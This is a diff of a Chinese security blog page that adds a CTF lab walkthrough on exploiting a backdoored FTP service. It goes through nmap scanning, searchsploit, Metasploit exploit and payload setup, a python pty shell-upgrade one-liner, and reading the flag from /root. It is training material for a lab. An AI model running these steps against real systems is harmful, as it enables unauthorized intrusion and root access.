@@ -7,17 +7,21 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>归档: 2019/11 - AqYoung - 安全羊</title>
+<title>CTF-FTP服务后门利用 - AqYoung - 安全羊</title>
 
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="AqYoung - 安全羊">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;2019&#x2F;11&#x2F;index.html">
+    <meta name="description" content="一、FTP介绍FTP是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。">
+<meta name="keywords" content="CTF,FTP远程溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-FTP服务后门利用">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;14&#x2F;CTF-FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8&#x2F;index.html">
 <meta property="og:site_name" content="AqYoung - 安全羊">
+<meta property="og:description" content="一、FTP介绍FTP是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;og_image.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;ftp&#x2F;ftp99.png">
+<meta property="og:updated_time" content="2019-12-14T12:02:07.313Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;og_image.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;ftp&#x2F;ftp99.png">
 
 
 
@@ -83,7 +87,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.png" alt="AqYoung - 安全羊" height="28">
+                <img src="/images/logo.png" alt="CTF-FTP服务后门利用" height="28">
             
             </a>
         </div>
@@ -133,40 +137,128 @@
         <div class="container">
             <div class="columns">
                 <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
-
-<div class="card widget">
-    <div class="card-content">
-        <h3 class="tag is-link">
-        十一月 2019
-        </h3>
-        <div class="timeline">
+<div class="card">
+    
+    <div class="card-image">
+        <span  class="image is-7by1">
+            <img class="thumbnail" src="/images/ftp/ftp99.png" alt="CTF-FTP服务后门利用">
+        </span>
+    </div>
+    
+    <div class="card-content article ">
         
-            <article class="media">
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-12-14T11:57:58.000Z">2019-12-14</time>
                 
-                <a href="/2019/11/04/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%BF%AB%E9%80%9F%E6%9C%89%E6%95%88%E7%9A%84%E2%80%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%9D/" class="media-left">
-                    <p class="image is-64x64">
-                        <img class="thumbnail" src="/images/x2.jpg" alt="如何进行快速有效的“信息收集”">
-                    </p>
-                </a>
-                
-                <div class="media-content">
-                    <div class="content">
-                        <time class="has-text-grey is-size-7 is-block is-uppercase" datetime="2019-11-04T12:11:28.000Z">2019-11-04</time>
-                        <a href="/2019/11/04/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%BF%AB%E9%80%9F%E6%9C%89%E6%95%88%E7%9A%84%E2%80%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%9D/" class="title has-link-black-ter is-size-6 has-text-weight-normal">如何进行快速有效的“信息收集”</a>
-                        <div class="level article-meta is-mobile">
-                            <div class="level-left">
-                                
-                                <div class="level-item is-size-7 is-uppercase">
-                                <a class="has-link-grey -link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
-                                </div>
-                                
-                            </div>
-                        </div>
-                    </div>
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CTF%E5%A4%BA%E6%97%97%E8%AE%AD%E7%BB%83/">CTF夺旗训练</a>
                 </div>
-            </article>
-        
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    4 分钟 读完 (大约 605 个字)
+                </span>
+                
+                
+            </div>
         </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                CTF-FTP服务后门利用
+            
+        </h1>
+        <div class="content">
+            <h2 id="一、FTP介绍"><a href="#一、FTP介绍" class="headerlink" title="一、FTP介绍"></a>一、FTP介绍</h2><p>FTP是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。<a id="more"></a>同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两个概念：“下载” (Download)和“上传”（Upload）。”下载”文件就是从远程主机拷贝文件至自己的计算机上，“上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。</p>
+<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux 192.168.43.153<br>靶场机器：192.168.43.138</p>
+<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测</strong><br>扫描主机服务信息以及服务版本<br>nmap -sV靶场lP地址<br><img src="/images/ftp/ftp1.png" alt></p>
+<p>快速扫描主机全部信息<br>nmap-T4-A-v靶场lP地址<br><img src="/images/ftp/ftp2.png" alt></p>
+<p><strong>2、发现漏洞</strong><br>分析nmap扫描结果，并对结果进行分析，挖掘可以利用的信息；<br><img src="/images/ftp/ftp3.png" alt><br>使用seachsploit，查看漏洞信息，找到可利用的溢出代码；<br><img src="/images/ftp/ftp4.png" alt></p>
+<p><strong>3、使用metasploit进行溢出</strong><br>打开Metasploit 在终端中输入msfconsole<br>输入search对应的软件及版本号</p>
+<p>使用exploit<br>-use exploit<br><img src="/images/ftp/ftp5.png" alt></p>
+<p>查看可以使用的payload<br>-show payload<br><img src="/images/ftp/ftp6.png" alt></p>
+<p>设置payload<br>–set payload<br><img src="/images/ftp/ftp7.png" alt></p>
+<p>设置参数<br>–show options<br>-set rhost 靶场lP<br>-set lhost 靶场lP</p>
+<p>进行远程溢出<br>-exploit<br><img src="/images/ftp/ftp7.png" alt><br><img src="/images/ftp/ftp8.png" alt></p>
+<p>执行命令<br>id<br><img src="/images/ftp/ftp9.png" alt></p>
+<p><strong>4、优化shell使用</strong><br>python pty开启终端</p>
+<pre><code>python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</code></pre><p><img src="/images/ftp/ftp10.png" alt></p>
+<p><strong>5、获取Flag</strong><br>一般情况下，靶场机器的lag值是存放在服务器的根目录下，/root/目录。<br>cd/root/<br>Is<br>cat flag<br>writeup 测试文档 总结文档<br><img src="/images/ftp/ftp10.png" alt></p>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>对于开放FTP、SSH、Telnet等服务的系统，可以尝试一些对应服务版本的漏洞代码；<br>对于系统，一定要注意利用现成的EXP来root主机；</p>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="has-link-grey -link" href="/tags/FTP%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA/" rel="tag">FTP远程溢出</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+        <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+    <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+</div>
+<script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];</script>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="/images/zhifubao.jpg" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="/images/weixin.jpg" alt="微信"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+                <span class="level-item">CTF-SMB信息泄露</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
     </div>
 </div>
 
@@ -743,7 +835,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.png" alt="AqYoung - 安全羊" height="28">
+                    <img src="/images/logo.png" alt="CTF-FTP服务后门利用" height="28">
                 
                 </a>
                 <p class="is-size-7">
